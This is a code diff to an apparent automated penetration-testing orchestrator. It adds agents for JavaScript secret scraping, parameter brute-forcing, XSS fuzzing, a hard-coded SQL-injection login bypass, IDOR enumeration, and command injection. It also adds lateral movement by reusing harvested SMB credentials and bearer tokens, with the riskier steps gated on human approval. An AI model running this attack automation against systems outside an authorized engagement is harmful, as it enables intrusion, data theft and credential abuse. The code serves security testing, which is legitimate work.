@@ -26,7 +26,14 @@ from typing import TYPE_CHECKING, Optional
 from kali_client import KaliClient, ToolResult
 from parsers import (
     extract_cves,
+    parse_arjun,
     parse_attackerkb_response,
+    parse_commix,
+    parse_curl,
+    parse_dalfox,
+    parse_feroxbuster,
+    parse_ffuf,
+    parse_js_analysis,
     parse_netexec_output,
     parse_gau_output,
     parse_gobuster_output,
@@ -70,6 +77,16 @@ class EngagementContext:
     discovered_vulns: list = field(default_factory=list)
     findings: list = field(default_factory=list)
     cves: list = field(default_factory=list)
+
+    # Phase E: Web App Testing
+    discovered_endpoints: list = field(default_factory=list)
+    # [{url, method, source_agent, params: [], base_url}]
+    discovered_params: dict = field(default_factory=dict)
+    # {endpoint_url: [param1, param2, ...]}
+    auth_context: dict = field(default_factory=dict)
+    # {tokens: [], cookies: [], credentials: [{user, pass, source}]}
+    attack_chains: list = field(default_factory=list)
+    # [{id, name, steps: [{agent, finding_id, description}], severity, impact}]
 
     # Stats for dashboard
     host_count: int = 0
@@ -912,6 +929,9 @@ class Orchestrator:
             backend_override=backend_override,
         )
 
+        # Store ctx reference so API endpoints can access attack chains
+        self.state.active_orchestrator_ctx = ctx
+
         logger.info("Starting engagement %s (type=%s, targets=%s)",
                      engagement_id, target_type, scope.get("targets", []))
 
@@ -958,8 +978,10 @@ class Orchestrator:
 
             await self._phase_threat_modeling(ctx)
             await self._phase_vuln_analysis(ctx)
+            await self._phase_webapp_testing(ctx)
             await self._phase_exploitation(ctx)
             await self._phase_post_exploitation(ctx)
+            await self._phase_lateral_movement(ctx)
             await self._phase_reporting(ctx)
 
             await self._emit_phase("COMPLETE")
@@ -1043,10 +1065,11 @@ class Orchestrator:
             action="dispatch_agents",
         )
 
-        # Run PO and AR in parallel
+        # Run PO, AR, and JS in parallel
         po_task = asyncio.create_task(self._recon_passive(ctx))
         ar_task = asyncio.create_task(self._recon_active(ctx))
-        await asyncio.gather(po_task, ar_task, return_exceptions=True)
+        js_task = asyncio.create_task(self._recon_js_analysis(ctx))
+        await asyncio.gather(po_task, ar_task, js_task, return_exceptions=True)
 
     async def _recon_passive(self, ctx: EngagementContext):
         """PO: Passive OSINT — GAU, WhatWeb, Subfinder."""
@@ -1915,6 +1938,9 @@ class Orchestrator:
 
         await pe.complete("Post-exploitation analysis complete.")
 
+        # AA: API Attacker (uses auth context from AT + endpoints from JS)
+        await self._webapp_api_attack(ctx)
+
         # DV: Detection Validator
         await self._detection_validation(ctx)
 
@@ -1972,6 +1998,753 @@ class Orchestrator:
             f"({report_data.get('severity_breakdown', {})}). "
             f"PDF generation deferred to Phase D."
         )
+
+    # ── Phase E: Web App Testing ──
+
+    async def _recon_js_analysis(self, ctx: EngagementContext):
+        """JS: Analyze JavaScript bundles for API endpoints and secrets."""
+        js = self._runner("JS", ctx)
+
+        # Wait briefly for AR to discover URLs first (JS needs web targets)
+        await asyncio.sleep(5)
+
+        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
+        # Also try building URLs from discovered hosts with web ports
+        web_ports = {80, 443, 8080, 8443, 8000, 8180, 8888, 3000, 5000, 9090}
+        https_ports = {443, 8443}
+        for r in ctx.discovered_hosts:
+            if r.get("port") in web_ports:
+                proto = "https" if r["port"] in https_ports else "http"
+                url = f"{proto}://{r['ip']}:{r['port']}"
+                if url not in web_targets:
+                    web_targets.append(url)
+
+        if not web_targets:
+            await js.complete("No web targets for JavaScript analysis.")
+            return
+
+        await js.think(
+            thought="Fetching and analyzing JavaScript bundles for API endpoints.",
+            reasoning="Modern SPAs embed API routes, admin paths, and sometimes secrets "
+                      "in JavaScript bundles. Static analysis reveals hidden attack surface.",
+        )
+
+        import re as _re
+        discovered = []
+
+        for target_url in web_targets[:5]:
+            # Fetch the main page to find JS bundle URLs
+            result = await js.run_tool(
+                "curl_raw",
+                {"url": target_url, "options": "-L"},
+                display=f"Fetching {target_url} for JS analysis...",
+            )
+            if not result.success:
+                continue
+
+            html = result.stdout or ""
+            script_urls = _re.findall(
+                r'<script[^>]+src=["\']([^"\']+\.js[^"\']*)["\']', html,
+            )
+
+            for script_src in script_urls[:10]:
+                # Resolve relative URLs
+                if script_src.startswith("//"):
+                    script_src = "https:" + script_src
+                elif script_src.startswith("/"):
+                    base_match = _re.match(r'(https?://[^/]+)', target_url)
+                    if base_match:
+                        script_src = base_match.group(1) + script_src
+                elif not script_src.startswith("http"):
+                    script_src = target_url.rstrip("/") + "/" + script_src
+
+                js_result = await js.run_tool(
+                    "curl_raw",
+                    {"url": script_src, "options": "-L"},
+                    display=f"Fetching JS: {script_src}...",
+                )
+                if not js_result.success or not js_result.stdout:
+                    continue
+
+                analysis = parse_js_analysis(js_result.stdout)
+
+                for endpoint in analysis.get("endpoints", []):
+                    ep = {
+                        "url": endpoint,
+                        "method": "GET",
+                        "source_agent": "JS",
+                        "params": [],
+                        "base_url": target_url,
+                    }
+                    ctx.discovered_endpoints.append(ep)
+                    discovered.append(endpoint)
+
+                for secret in analysis.get("secrets", []):
+                    await js.report_finding(
+                        title=f"Secret in JS bundle: {secret[:50]}",
+                        severity="high",
+                        category="Information Disclosure",
+                        target=script_src,
+                        description=f"Hardcoded secret found in JavaScript source: {secret[:200]}",
+                        evidence=secret[:500],
+                    )
+
+                for route in analysis.get("admin_routes", []):
+                    ep = {
+                        "url": route,
+                        "method": "GET",
+                        "source_agent": "JS",
+                        "params": [],
+                        "base_url": target_url,
+                        "admin": True,
+                    }
+                    ctx.discovered_endpoints.append(ep)
+                    discovered.append(route)
+
+        await js.complete(
+            f"JS analysis complete: {len(discovered)} endpoints, "
+            f"{len(ctx.discovered_endpoints)} total endpoints discovered."
+        )
+
+    async def _phase_webapp_testing(self, ctx: EngagementContext):
+        """Phase E web app testing: PD → WA → AT (sequential — each depends on prior)."""
+        # Only run if we have web targets or discovered endpoints
+        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
+        if not web_targets and not ctx.discovered_endpoints:
+            return
+
+        await self._emit_phase("WEB APP TESTING")
+
+        or_runner = self._runner("OR", ctx)
+        await or_runner.think(
+            thought="Dispatching web application testing agents.",
+            reasoning="Parameter discovery feeds into web fuzzing, which feeds into auth testing. "
+                      "Sequential pipeline: PD → WA → AT.",
+            action="dispatch_webapp_agents",
+        )
+
+        await self._webapp_param_discovery(ctx)
+        await self._webapp_fuzzing(ctx)
+        await self._webapp_auth_testing(ctx)
+
+    async def _webapp_param_discovery(self, ctx: EngagementContext):
+        """PD: Discover hidden parameters on discovered endpoints."""
+        pd = self._runner("PD", ctx)
+
+        # Build target list from discovered endpoints and web URLs
+        targets = []
+        for ep in ctx.discovered_endpoints:
+            base = ep.get("base_url", "")
+            url = ep.get("url", "")
+            if url.startswith("http"):
+                targets.append(url)
+            elif base and url.startswith("/"):
+                full = base.rstrip("/") + url
+                if full not in targets:
+                    targets.append(full)
+        # Add discovered web URLs
+        for url in ctx.discovered_urls:
+            if url.startswith("http") and url not in targets:
+                targets.append(url)
+
+        if not targets:
+            await pd.complete("No endpoints for parameter discovery.")
+            return
+
+        await pd.think(
+            thought=f"Discovering hidden parameters on {len(targets)} endpoints.",
+            reasoning="Arjun brute-forces parameter names with smart heuristics "
+                      "to find hidden GET/POST parameters that expand the attack surface.",
+        )
+
+        total_params = 0
+        for target_url in targets[:10]:
+            result = await pd.run_tool(
+                "arjun_params",
+                {"url": target_url},
+                display=f"Arjun parameter discovery on {target_url}...",
+            )
+            if result.success:
+                parsed = parse_arjun(result.stdout)
+                if parsed.get("params"):
+                    ctx.discovered_params[target_url] = parsed["params"]
+                    total_params += len(parsed["params"])
+                    # Also update matching endpoint entries
+                    for ep in ctx.discovered_endpoints:
+                        ep_url = ep.get("url", "")
+                        if not ep_url.startswith("http"):
+                            ep_url = ep.get("base_url", "").rstrip("/") + ep_url
+                        if ep_url == target_url:
+                            ep["params"] = parsed["params"]
+
+        await pd.complete(
+            f"Parameter discovery complete: {total_params} hidden parameters "
+            f"on {len(ctx.discovered_params)} endpoints."
+        )
+
+    async def _webapp_fuzzing(self, ctx: EngagementContext):
+        """WA: Fuzz endpoints for XSS, injection, and IDOR."""
+        wa = self._runner("WA", ctx)
+
+        # Collect endpoints with parameters
+        fuzz_targets = []
+        for url, params in ctx.discovered_params.items():
+            fuzz_targets.append({"url": url, "params": params})
+        for ep in ctx.discovered_endpoints:
+            if ep.get("params"):
+                base = ep.get("base_url", "")
+                url = ep.get("url", "")
+                full_url = url if url.startswith("http") else base.rstrip("/") + url
+                # Avoid duplicates
+                if not any(ft["url"] == full_url for ft in fuzz_targets):
+                    fuzz_targets.append({"url": full_url, "params": ep["params"]})
+
+        if not fuzz_targets:
+            # Fall back to content discovery with Feroxbuster
+            web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
+            if not web_targets:
+                await wa.complete("No targets for web app fuzzing.")
+                return
+
+            await wa.think(
+                thought="No parameterized endpoints — running content discovery.",
+                reasoning="Deep recursive content discovery may reveal additional "
+                          "endpoints and hidden resources.",
+            )
+            for target_url in web_targets[:3]:
+                result = await wa.run_tool(
+                    "feroxbuster_scan",
+                    {"url": target_url},
+                    display=f"Feroxbuster recursive scan on {target_url}...",
+                )
+                if result.success:
+                    parsed = parse_feroxbuster(result.stdout)
+                    for entry in parsed:
+                        if entry.get("status") in (200, 301, 302, 403):
+                            ctx.discovered_urls.append(entry["url"])
+            await wa.complete("Content discovery complete via Feroxbuster.")
+            return
+
+        await wa.think(
+            thought=f"Fuzzing {len(fuzz_targets)} endpoints for XSS and injection.",
+            reasoning="Dalfox scans for XSS on parameterized endpoints. "
+                      "ffuf tests IDOR patterns on ID-based endpoints.",
+        )
+
+        xss_count = 0
+        for ft in fuzz_targets[:10]:
+            url = ft["url"]
+            params = ft.get("params", [])
+
+            # XSS scanning with Dalfox on each parameter
+            for param in params[:5]:
+                test_url = (
+                    f"{url}?{param}=FUZZ"
+                    if "?" not in url
+                    else f"{url}&{param}=FUZZ"
+                )
+                result = await wa.run_tool(
+                    "dalfox_xss",
+                    {"url": test_url},
+                    display=f"Dalfox XSS: {url} ({param})...",
+                )
+                if result.success:
+                    xss_findings = parse_dalfox(result.stdout)
+                    for xss in xss_findings:
+                        xss_count += 1
+                        await wa.report_finding(
+                            title=f"XSS: {xss.get('type', 'Reflected')} on {param}",
+                            severity=xss.get("severity", "high").lower(),
+                            category="Cross-Site Scripting",
+                            target=url,
+                            description=(
+                                f"Parameter: {param}. "
+                                f"Payload: {xss.get('payload', 'N/A')}"
+                            ),
+                            evidence=xss.get("poc", ""),
+                        )
+                        self._record_chain_step(
+                            ctx, "WA",
+                            f"XSS on {param} at {url}",
+                            xss.get("severity", "high").lower(),
+                        )
+
+        await wa.complete(f"Web app fuzzing complete: {xss_count} XSS findings.")
+
+    async def _webapp_auth_testing(self, ctx: EngagementContext):
+        """AT: Test authentication bypasses, JWT manipulation, registration abuse."""
+        at = self._runner("AT", ctx)
+
+        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
+        if not web_targets:
+            await at.complete("No web targets for auth testing.")
+            return
+
+        base_url = web_targets[0].rstrip("/")
+
+        await at.think(
+            thought="Testing authentication mechanisms for bypasses and weaknesses.",
+            reasoning="Modern web apps use JWT, session cookies, or API keys. "
+                      "Testing for SQL injection in login, registration abuse, "
+                      "and unauthenticated admin access.",
+            action="test_auth",
+        )
+
+        # Test 1: SQL injection in login endpoints
+        login_endpoints = [
+            ep for ep in ctx.discovered_endpoints
+            if any(
+                k in ep.get("url", "").lower()
+                for k in ("login", "auth", "signin", "session")
+            )
+        ]
+
+        for ep in login_endpoints[:3]:
+            url = ep.get("url", "")
+            if not url.startswith("http"):
+                url = base_url + url
+
+            result = await at.run_tool(
+                "curl_raw",
+                {
+                    "url": url,
+                    "options": (
+                        "-X POST -H 'Content-Type: application/json' "
+                        "-d '{\"email\":\"\\' OR 1=1--\",\"password\":\"test\"}'"
+                    ),
+                },
+                display=f"Testing SQLi on login: {url}...",
+            )
+            if result.success:
+                parsed = parse_curl(result.stdout)
+                if parsed.get("status_code") == 200 and parsed.get("body_json"):
+                    body = parsed["body_json"]
+                    if body.get("authentication") or body.get("token") or body.get("access_token"):
+                        await at.report_finding(
+                            title="SQL Injection Authentication Bypass",
+                            severity="critical",
+                            category="Authentication",
+                            target=url,
+                            description=(
+                                "Login endpoint accepts SQL injection in credentials, "
+                                "allowing authentication bypass."
+                            ),
+                            cvss=9.8,
+                            evidence=result.stdout[:2000],
+                        )
+                        self._record_chain_step(
+                            ctx, "AT", "SQLi auth bypass", "critical",
+                        )
+                        # Store auth context
+                        token = body.get("token") or body.get("access_token", "")
+                        if token:
+                            ctx.auth_context.setdefault("tokens", []).append(token)
+
+        # Test 2: User registration
+        register_endpoints = [
+            ep for ep in ctx.discovered_endpoints
+            if any(
+                k in ep.get("url", "").lower()
+                for k in ("register", "signup", "users")
+            )
+        ]
+
+        for ep in register_endpoints[:2]:
+            url = ep.get("url", "")
+            if not url.startswith("http"):
+                url = base_url + url
+
+            result = await at.run_tool(
+                "curl_raw",
+                {
+                    "url": url,
+                    "options": (
+                        "-X POST -H 'Content-Type: application/json' "
+                        "-d '{\"email\":\"test@athena.local\",\"password\":\"Test123!\","
+                        "\"passwordRepeat\":\"Test123!\"}'"
+                    ),
+                },
+                display=f"Testing registration: {url}...",
+            )
+            if result.success:
+                parsed = parse_curl(result.stdout)
+                if parsed.get("status_code") in (200, 201):
+                    ctx.auth_context.setdefault("credentials", []).append({
+                        "user": "test@athena.local",
+                        "pass": "Test123!",
+                        "source": "AT registration",
+                    })
+
+        # Test 3: Unauthenticated admin access
+        admin_endpoints = [
+            ep for ep in ctx.discovered_endpoints
+            if ep.get("admin") or "admin" in ep.get("url", "").lower()
+        ]
+
+        for ep in admin_endpoints[:3]:
+            url = ep.get("url", "")
+            if not url.startswith("http"):
+                url = base_url + url
+
+            result = await at.run_tool(
+                "curl_raw",
+                {"url": url, "options": "-L"},
+                display=f"Testing unauthenticated admin access: {url}...",
+            )
+            if result.success:
+                parsed = parse_curl(result.stdout)
+                if parsed.get("status_code") == 200:
+                    await at.report_finding(
+                        title=f"Unauthenticated Admin Access: {url}",
+                        severity="critical",
+                        category="Authorization",
+                        target=url,
+                        description="Admin endpoint accessible without authentication.",
+                        evidence=result.stdout[:2000],
+                    )
+
+        await at.complete(
+            f"Auth testing complete. "
+            f"Tokens: {len(ctx.auth_context.get('tokens', []))}, "
+            f"Credentials: {len(ctx.auth_context.get('credentials', []))}."
+        )
+
+    async def _webapp_api_attack(self, ctx: EngagementContext):
+        """AA: Exploit discovered API endpoints with authenticated context."""
+        aa = self._runner("AA", ctx)
+
+        if not ctx.discovered_endpoints:
+            await aa.complete("No API endpoints discovered — skipping API attacks.")
+            return
+
+        tokens = ctx.auth_context.get("tokens", [])
+        auth_header = f"-H 'Authorization: Bearer {tokens[0]}'" if tokens else ""
+
+        await aa.think(
+            thought=f"Launching API attacks on {len(ctx.discovered_endpoints)} endpoints.",
+            reasoning="Testing IDOR, mass assignment, command injection, and NoSQL injection "
+                      "on discovered API endpoints using authenticated context.",
+            action="api_attack",
+        )
+
+        web_targets = [u for u in ctx.discovered_urls if u.startswith("http")]
+        base_url = web_targets[0].rstrip("/") if web_targets else ""
+
+        if not base_url:
+            await aa.complete("No base URL for API attacks.")
+            return
+
+        # Test 1: IDOR on user/resource endpoints
+        idor_endpoints = [
+            ep for ep in ctx.discovered_endpoints
+            if any(
+                k in ep.get("url", "").lower()
+                for k in ("users", "user", "profile", "account", "order")
+            )
+        ]
+
+        for ep in idor_endpoints[:5]:
+            url = ep.get("url", "")
+            if not url.startswith("http"):
+                url = base_url + url
+
+            for test_id in [1, 2, 3]:
+                test_url = f"{url}/{test_id}"
+                result = await aa.run_tool(
+                    "curl_raw",
+                    {"url": test_url, "options": f"-L {auth_header}"},
+                    display=f"IDOR test: {test_url}...",
+                )
+                if result.success:
+                    parsed = parse_curl(result.stdout)
+                    if parsed.get("status_code") == 200 and parsed.get("body_json"):
+                        body = parsed["body_json"]
+                        if body.get("email") or body.get("username") or body.get("data"):
+                            await aa.report_finding(
+                                title=f"IDOR: Unauthorized data access on {url}",
+                                severity="high",
+                                category="Authorization",
+                                target=test_url,
+                                description=(
+                                    f"API endpoint exposes user data via sequential ID "
+                                    f"enumeration. Accessed ID={test_id} without proper "
+                                    f"authorization check."
+                                ),
+                                evidence=result.stdout[:2000],
+                            )
+                            self._record_chain_step(
+                                ctx, "AA", f"IDOR on {url}/{test_id}", "high",
+                            )
+                            break  # One finding per endpoint
+
+        # Test 2: Command injection via Commix (HITL gated)
+        injectable_endpoints = [
+            ep for ep in ctx.discovered_endpoints
+            if ep.get("params") and any(
+                p.lower() in (
+                    "cmd", "command", "exec", "run", "query",
+                    "search", "input", "path", "file",
+                )
+                for p in ep.get("params", [])
+            )
+        ]
+
+        for ep in injectable_endpoints[:3]:
+            url = ep.get("url", "")
+            if not url.startswith("http"):
+                url = base_url + url
+
+            approved = await aa.request_approval(
+                action=f"Command injection test on {url}",
+                description=(
+                    "Commix will attempt OS command injection on detected parameters. "
+                    "Non-destructive payloads only (id, whoami, hostname)."
+                ),
+                risk_level="high",
+                target=url,
+            )
+
+            if approved:
+                result = await aa.run_tool(
+                    "commix_inject",
+                    {"url": url},
+                    display=f"Commix injection test: {url}...",
+                )
+                if result.success:
+                    parsed = parse_commix(result.stdout)
+                    if parsed.get("injectable"):
+                        await aa.report_finding(
+                            title=f"Command Injection: {parsed.get('parameter', url)}",
+                            severity="critical",
+                            category="Injection",
+                            target=url,
+                            description=(
+                                f"OS command injection via "
+                                f"{parsed.get('technique', 'unknown')} technique. "
+                                f"Parameter: {parsed.get('parameter', 'unknown')}"
+                            ),
+                            cvss=9.8,
+                            evidence=parsed.get("details", ""),
+                        )
+                        self._record_chain_step(
+                            ctx, "AA",
+                            f"Command injection on {url}",
+                            "critical",
+                        )
+
+        await aa.complete(
+            f"API attack testing complete. {ctx.finding_count} total findings."
+        )
+
+    async def _phase_lateral_movement(self, ctx: EngagementContext):
+        """Phase 6: LM lateral movement with harvested credentials."""
+        # Collect credentials from all sources
+        creds = ctx.auth_context.get("credentials", [])
+        tokens = ctx.auth_context.get("tokens", [])
+        engagement_creds = [
+            c for c in self.state.credentials
+            if c.get("engagement_id") == ctx.engagement_id
+        ]
+
+        if not creds and not tokens and not engagement_creds:
+            # No credentials to test — skip silently
+            lm = self._runner("LM", ctx)
+            await lm.complete(
+                "No credentials/tokens harvested — skipping lateral movement."
+            )
+            return
+
+        await self._emit_phase("LATERAL MOVEMENT")
+
+        lm = self._runner("LM", ctx)
+        await lm.think(
+            thought="Attempting lateral movement with harvested credentials.",
+            reasoning=(
+                f"Have {len(creds)} web creds, {len(tokens)} tokens, "
+                f"{len(engagement_creds)} tool-harvested creds. "
+                "Testing reuse against other services on discovered hosts."
+            ),
+            action="lateral_movement",
+        )
+
+        # HITL gate
+        approved = await lm.request_approval(
+            action="Lateral movement with harvested credentials",
+            description=(
+                f"Test {len(creds) + len(engagement_creds)} harvested credentials "
+                "against SSH, SMB, and web services on discovered hosts. "
+                "Non-destructive: login validation only."
+            ),
+            risk_level="high",
+            target=ctx.engagement_id,
+        )
+
+        if not approved:
+            await lm.complete("Lateral movement skipped — HITL rejected.")
+            return
+
+        hosts = list(set(r["ip"] for r in ctx.discovered_hosts))
+        all_creds = creds + [
+            {"user": c.get("username", ""), "pass": "", "source": c.get("source", "")}
+            for c in engagement_creds
+            if c.get("username")
+        ]
+
+        lateral_findings = 0
+        for cred in all_creds[:5]:
+            username = cred.get("user", "")
+            if not username:
+                continue
+
+            for host_ip in hosts[:5]:
+                # Test SMB via NetExec if port 445/139 is open
+                smb_services = [
+                    r for r in ctx.discovered_hosts
+                    if r["ip"] == host_ip and r.get("port") in (445, 139)
+                ]
+                if smb_services:
+                    password = cred.get("pass", "")
+                    result = await lm.run_tool(
+                        "crackmapexec_scan",
+                        {
+                            "target": host_ip,
+                            "protocol": "smb",
+                            "additional_args": f"-u '{username}' -p '{password}' --shares",
+                        },
+                        display=f"NetExec SMB: {username}@{host_ip}...",
+                    )
+                    if result.success:
+                        nxc_results = parse_netexec_output(result.stdout)
+                        for r in nxc_results:
+                            if r.get("status") in ("pwned", "ok"):
+                                lateral_findings += 1
+                                await lm.report_finding(
+                                    title=f"Lateral Movement: {username}@{host_ip} (SMB)",
+                                    severity="critical",
+                                    category="Lateral Movement",
+                                    target=host_ip,
+                                    description=(
+                                        f"Credential reuse successful. User {username} "
+                                        f"(from {cred.get('source', 'unknown')}) "
+                                        f"has valid SMB access on {host_ip}."
+                                    ),
+                                    evidence=result.stdout[:2000],
+                                )
+                                self._record_chain_step(
+                                    ctx, "LM",
+                                    f"Lateral: {username}@{host_ip} (SMB)",
+                                    "critical",
+                                )
+
+                # Test HTTP services with harvested tokens
+                web_services = [
+                    r for r in ctx.discovered_hosts
+                    if r["ip"] == host_ip
+                    and r.get("port") in (80, 443, 8080, 8443, 3000, 5000)
+                ]
+                if web_services and tokens:
+                    port = web_services[0]["port"]
+                    proto = "https" if port in (443, 8443) else "http"
+                    test_url = f"{proto}://{host_ip}:{port}/"
+                    result = await lm.run_tool(
+                        "curl_raw",
+                        {
+                            "url": test_url,
+                            "options": f"-H 'Authorization: Bearer {tokens[0]}' -L",
+                        },
+                        display=f"Token reuse test: {test_url}...",
+                    )
+                    if result.success:
+                        parsed = parse_curl(result.stdout)
+                        if parsed.get("status_code") == 200 and parsed.get("body_json"):
+                            await lm.report_finding(
+                                title=f"Token Reuse: Valid on {host_ip}:{port}",
+                                severity="high",
+                                category="Lateral Movement",
+                                target=test_url,
+                                description=(
+                                    f"Harvested JWT/bearer token accepted by "
+                                    f"{host_ip}:{port}. Cross-service token reuse."
+                                ),
+                                evidence=result.stdout[:2000],
+                            )
+
+        # Write attack chains to Neo4j
+        await self._write_chains_neo4j(ctx)
+
+        await lm.complete(
+            f"Lateral movement complete: {lateral_findings} successful pivots."
+        )
+
+    def _record_chain_step(
+        self, ctx: EngagementContext, agent: str,
+        description: str, severity: str,
+    ):
+        """Record an attack chain step linking to the latest finding."""
+        if not ctx.findings:
+            return
+
+        latest = ctx.findings[-1]
+        step = {
+            "agent": agent,
+            "finding_id": latest["id"],
+            "description": description,
+            "phase": {
+                "JS": 2, "PD": 4, "WA": 4, "AT": 4, "AA": 5, "LM": 6,
+            }.get(agent, 0),
+        }
+
+        # Append to current chain or create new one
+        if ctx.attack_chains:
+            current = ctx.attack_chains[-1]
+            # If last step was from an earlier or same phase, extend the chain
+            if current["steps"][-1]["phase"] <= step["phase"]:
+                current["steps"].append(step)
+                # Upgrade chain severity if needed
+                sev_order = {
+                    "info": 0, "low": 1, "medium": 2, "high": 3, "critical": 4,
+                }
+                if sev_order.get(severity, 0) > sev_order.get(
+                    current["severity"], 0
+                ):
+                    current["severity"] = severity
+                return
+
+        # New chain
+        chain = {
+            "id": f"chain-{uuid.uuid4().hex[:6]}",
+            "name": description,
+            "steps": [step],
+            "severity": severity,
+            "impact": "",
+        }
+        ctx.attack_chains.append(chain)
+
+    async def _write_chains_neo4j(self, ctx: EngagementContext):
+        """Write [:LEADS_TO] relationships between chained findings in Neo4j."""
+        from server import neo4j_available, neo4j_driver
+        if not neo4j_available or not neo4j_driver:
+            return
+
+        try:
+            with neo4j_driver.session() as session:
+                for chain in ctx.attack_chains:
+                    steps = chain.get("steps", [])
+                    for i in range(len(steps) - 1):
+                        src_id = steps[i].get("finding_id", "")
+                        dst_id = steps[i + 1].get("finding_id", "")
+                        if src_id and dst_id:
+                            session.run("""
+                                MATCH (f1:Finding {id: $src}), (f2:Finding {id: $dst})
+                                MERGE (f1)-[:LEADS_TO {
+                                    chain_id: $chain_id,
+                                    chain_severity: $severity
+                                }]->(f2)
+                            """, src=src_id, dst=dst_id,
+                                 chain_id=chain["id"],
+                                 severity=chain["severity"])
+        except Exception as e:
+            logger.warning("Neo4j chain write error: %s", e)
 
     # ── Helpers ──
 
